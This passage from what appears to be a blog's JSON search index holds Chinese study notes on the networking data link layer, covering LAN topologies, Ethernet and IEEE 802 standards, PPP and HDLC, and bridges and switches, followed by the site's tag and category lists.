共享资源能力强, 设备投入少, 成本低, 安装使用方便, 单个节点出现工作对网络影响小 环形拓扑 节点的通信链路组成一个环 设备和线路比较节省 有单点故障, 不便扩充, 系统响应延时长, 信息传输效率低 树型拓扑 所有结点按树形组成网络 易于拓展, 易于隔离故障 容易有单点故障 总线型最常用 局域网的传输介质 有线局域网双绞线, 同轴电缆, 光纤 无线局域网电磁波 局域网介质访问控制方法 CSMA/CD常用于总线型局域网, 也用于树形网络 令牌总线常用于总线型局域网, 也用于树形网络将网络中各个工作站按一定顺序排列形成一个逻辑环只有令牌的持有者才能控制总线, 拥有发送信息的权力 令牌环用于环形局域网(逻辑上的结构是环形, 实际物理结构为星型) 局域网的分类 类型 逻辑拓扑结构 物理拓扑结构 其他 以太网 总线型 星型或拓展星型 使用 CSMA/CD,应用最广泛, 包括标准以太网(10BaseT/10Mbps), 快速以太网(100Mbps), 千兆以太网(1000Mbps) 和 10G 以太网; 符合 IEEE802.3 标准 令牌环网 环形 星型 已过时 FDDI 网 环形 双拓扑 也叫光纤分布式数据接口 ATM 网 新型的单元交换技术, 使用 53 字节固定长度的单元进行交换 无线局域网(WLAN) 采用 IEEE802.11 标准 IEEE802 标准由 IEEE 802 LAN/MAN 标准委员会制定的局域网,城域网技术标准最广泛应用的有以太网, 令牌环, 无线局域网等 IEEE 802.3以太网介质访问控制协议(CSMA/CD)及物理层技术规范 IEEE 802.5令牌环网的介质访问控制协议及物理层技术规范 IEEE 802.8光纤技术咨询组 提供有关光纤联网的技术咨询 IEEE 802.11无线局域网(WLAN)的介质访问控制协议及物理层技术规范 MAC 子层和 LLC 子层IEEE 802 标准描述的局域网参考模型对应 OSI 参考模型的数据链路层和物理层将数据链路层划分为逻辑链路子层 LLC 和介质访问控制子层 MAC LLC(逻辑链路子层) 负责识别网络层协议, 然后对其封装 LLC 报头定义数据链路层收到帧时, 应当如何处理数据包 为网络层提供服务:无确认连接面向连接带确认无连接高速传送 MAC(介质访问控制子层) 数据帧的封装和卸载 帧的寻址和识别 帧的接收与发送 链路的管理 帧的差错控制 屏蔽不同物理链路种类的差异 以太网(Ethrnet)以太网(基带总线局域网规范)使用 CSMA/CD 技术 逻辑上时总线网, 物理上是星型网 优点 造价低 应用范围最广泛的局域网技术 比令牌环网, ATM 网便宜, 简单 满足网络速率要求: 10Mb/s~10Gb/s 提供无连接,不可靠服务 只实现无差错接收, 不实现可靠传输 无连接发送方和接收方之间无握手过程 不可靠不对发送方的数据帧编号接收方不向发送方进行确认差错帧直接丢弃, 差错由高层负责 DIX Ethernet V2第一个局域网产品(以太网)规约满足该规约的就可以叫以太网 IEEE 802.3IEEE 802 委员会 802.3 工作组制定的第一个 IEEE 的以太网标准 IEEE802.3 只与 DIX Ethernet V2 在帧的格式上有 2 个字节的微小不同 10BASE-T 以太网指的是传送基带信号的双绞线以太网T 表示采用双绞线10BASE-T 采用的是无屏蔽双绞线(UTP), 传输速率是 10Mb/s物理上采用星型拓扑, 逻辑上总线型每段双绞线最长100m采用曼彻斯特编码, 一个比特对应两次信号变化采用 CSMA/CD 技术 适配器 计算机与外界的局域网连接的接口 MAC 地址(物理地址/硬件地址) 在数据链路层上标识一个主机的标识符, 全球唯一共 48 位,前 24 位表示厂家, 后 24 位厂家指定 以太网 MAC 帧最常使用以太网 V2 的格式 与 IEEE802.3 的区别 第三个字段是长度/类型 长度/类型字段小于 0x0600 时, 数据字段必须装入 LLC 子层 高速以太网速度 ≥100MB/s 的以太网 100BASE-T 以太网在双绞线上传输 100Mb/s 基带信号的星型拓扑以太网使用 IEEE802.3 的 CSMA/CD支持全双工和半双工, 可在全双工工作方式下无冲突 吉比特以太网在光纤或双绞线上传送 1Gb/s 信号支持全双工和半双工, 可在全双工工作方式无冲突 10 吉比特在光纤上传送 10Gb/s 信号支持全双工, 无争用问题, 不会发生冲突 无线局域网(IEEE 802.11)覆盖范围有几千米 接收端和发送端指的是实际通信中负责接收和发生信息的基站 目的地址和源地址分别指的通信双方的 MAC 地址 无线局域网的分类 有固定基础设施无线局域网 无固定基础设施无线局域网的自组织网络 广域网跨接很大的物理范围, 所覆盖的范围从几十公里到几千公里能连接多个城市或国家, 横跨几个洲并能提供远距离通信 使用分组交换技术 通信子网利用公用分组交换网, 卫星通信网和无线分组交换, 将分布在不同地区的局域网或计算机系统互联, 达到资源共享的目的 因特网是世界范围内最大的广域网 PPP 协议PPP(点对点协议)是使用最广泛的数据链路层协议, 用户使用拨号电话接入因特网时一般使用 PPP 协议只支持全双工链路 特点 简单对链路层的帧无需纠错, 无需序号, 无需流量控制 封装成帧添加帧定界符 透明传输与帧定界符一样的比特组合的数据采用:异步线路用字节填充, 同步线路用比特填充 字符(字节)填充法异步线路: 一个字节一个字节发送同步线路: 一个比特一个比特发送 多种网络层协议封装的 IP 数据包可以采用多种协议 多种类型链路串行/并行, 同步/异步, 电/光… 差错检错在帧中添加 CRC 冗余位, 检错出粗就丢弃 检错连接状态检测链路是否正常工作 最大传送单元数据部分最大长度 MTU 网络层地址协商知道双方的网络层地址 数据压缩协商将发送的数据进行压缩 PPP 协议不进行以下操作: 纠错 流量控制 为帧编号 不支持多点线路(PPP 协议只满足点对点的连接) PPP 协议的三个组成部分 将 IP 数据包封装到串行链路(同步串行/异步串行)的方法 链路控制协议 LCP建立并维护数据链路的连接(实现身份验证) 网络控制协议 NCPPPP 可支持多种网络层协议, 每种网络层协议用一个 NCP 来配置, 为网络层协议建立和配置逻辑连接 PPP 协议的工作状态图 PPP 协议的帧格式 HDLC 协议 不属于 TCP/IP 协议族 HCLD(高级数据链路控制协议)是在同步网上传输数据,面向比特的数据链路层协议, 由(ISO)根据 SDLC 协议扩展开发而成 数据报文可透明传输(用0 比特插入法, 易于硬件实现)采用全双工链路 HDLC 的站 主站发送命令(包括数据信息)帧, 接收响应帧负责对整个链路的控制系统的初始化, 流程的控制, 差错检测或恢复等 从站接收由主站发来的命令帧, 向主站发送响应帧配合主站参与差错恢复等链路控制 复合站既能发送也能接收命令帧和响应帧负责整个链路的控制 三种数据操作方式 正常响应方式从站要发送消息, 先经过主站的同意, 从站才能发送数据 异步平衡方式每个复合站都可以进行对别的站的数据传输 异步响应方式从站可以不经过主站同意就发送数据 HDLC 的帧格式 控制字段 C 信息帧(I)第 1 位为0，用来传输数据信息，或使用捎带技术对数据进行确认; 监督帧(S) 前 2 位为10，用于流量控制和差错控制，执行对信息帧的确认、请求重发和请求暂停发送等功能 无编号帧(U) 前 2 位为11，用于提供对链路的建立、拆除等多种控制功能。 PPP 协议与 HDLC 协议比较 相同点 只支持全双工链路 可以实现透明传输PPP 可以实现比特/字节填充和0 比特填充HDLC 只实现 0 比特填充 都可以实现差错检测, 但不进行差错纠正 不同点 PPP 协议面向字节HDLC 协议面向比特 PPP 协议有 2 比特协议字段HDLC 没有 PPP 协议无序号和确认机制HDLC 协议有编号和确认机制 PPP 协议不可靠HDLC 协议可靠 数据链路层的设备 冲突域 在一个冲突域中的每一个结点都能收到所有被发送的帧但是同一时间只有一台设备能发送信息 广播域 网络中能接受任一设备发出的广播帧的所有设备的集合一个设备发送广播帧, 能收到这个信号的所有设备的集合组成广播域 物理层设备(中继器, 集线器)不能隔离冲突域和广播域数据链路层设备(网桥,交换机)能隔离冲突域,不能隔离广播域网络层设备(路由器)能隔离冲突域和广播域 网桥 网桥用实现不同的网段的互联, 即网桥的两端为不同网段通过网桥连接的网络的吞吐量为每个网段的吞吐量相加 网桥根据 MAC 帧的目的地址对帧进行转发和过滤网桥收到帧后, 先检测帧的 MAC 地址, 然后确定转发到哪个接口(或者丢弃) 优点 过滤通信量, 增大吞吐量可以分割冲突域, 即每个冲突域内可以单独进行通信 扩大网络范围 提高了可靠性 可以互联不同物理层, 不同 MAC 子层和不同速率的以太网 透明网桥以太网上的站点并不知道所发送的帧将经过哪些网桥是一种即插即用的设备(通过自学习算法) 自学习网桥中有一个转发表(地址,接口)(每一个网段中都是广播发送消息)若从某个端口收到信息, 则将该信息的源 MAC 地址与对应的端口号记录到转发表收到的消息的目的 MAC 地址存在转发表中, 则将该信息转发到对应的端口(当要转发的接口与收到信息的接口不同使转发, 相同时不转发)收到的消息的目的 MAC 地址不在转发表中, 则转发到除接收信息端口的其他所有端口 源路由网桥在发送帧时, 把最详细的最佳路径(路由最少或时间最短)放在帧的首部中 实现原理: 源站用广播的方式向目的站发送一个发现帧 目的站收到发现帧(有多少条源站到目的站的路径就会收到多少各)后, 按原路返回这个发现帧, 这个发现帧记录这由源站到目的站的路由数量和所花时间 目的站返回每个发现帧对应一种方案, 由源站选择路由最少或时间最短的方案来作为之后的传输路径 交换机(多接口网桥)每一个端口对应的网络就是一个冲突域可以独占传输媒体的带宽(每一个端口对应的网络带宽就是交换机传输媒体的带宽) 直通式交换机检查完目的地址(6B)就立刻转发延迟小, 可靠性低, 无法支持具有不同速率的端口的交换 存储转发式交换机将帧放入高速缓存, 并检查是否正确, 正确则转发, 否则丢弃延迟大, 可靠性高, 可以支持具有不同速率的端口的交换","link":"/2021/07/15/network4/"}],"tags":[{"name":"WEB","slug":"WEB","link":"/tags/WEB/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"PE","slug":"PE","link":"/tags/PE/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"LKM","slug":"LKM","link":"/tags/LKM/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"C","slug":"C","link":"/tags/C/"},{"name":"Kivy","slug":"Kivy","link":"/tags/Kivy/"},{"name":"App","slug":"App","link":"/tags/App/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"},{"name":"ClientIP","slug":"ClientIP","link":"/tags/ClientIP/"},{"name":"InformationLeakage","slug":"InformationLeakage","link":"/tags/InformationLeakage/"},{"name":"DataStructure","slug":"DataStructure","link":"/tags/DataStructure/"},{"name":"Computer Organization Principles","slug":"Computer-Organization-Principles","link":"/tags/Computer-Organization-Principles/"},{"name":"NetWork","slug":"NetWork","link":"/tags/NetWork/"}],"categories":[{"name":"Firewall","slug":"Firewall","link":"/categories/Firewall/"},{"name":"Application","slug":"Application","link":"/categories/Application/"},{"name":"Note","slug":"Note","link":"/categories/Note/"},{"name":"PE","slug":"Note/PE","link":"/categories/Note/PE/"},{"name":"WEB","slug":"Note/WEB","link":"/categories/Note/WEB/"},{"name":"Kivy","slug":"Application/Kivy","link":"/categories/Application/Kivy/"},{"name":"SQL","slug":"Note/SQL","link":"/categories/Note/SQL/"},{"name":"DataStructure","slug":"Note/DataStructure","link":"/categories/Note/DataStructure/"},{"name":"Computer Organization Principles","slug":"Note/Computer-Organization-Principles","link":"/categories/Note/Computer-Organization-Principles/"},{"name":"NetWork","slug":"Note/NetWork","link":"/categories/Note/NetWork/"}]}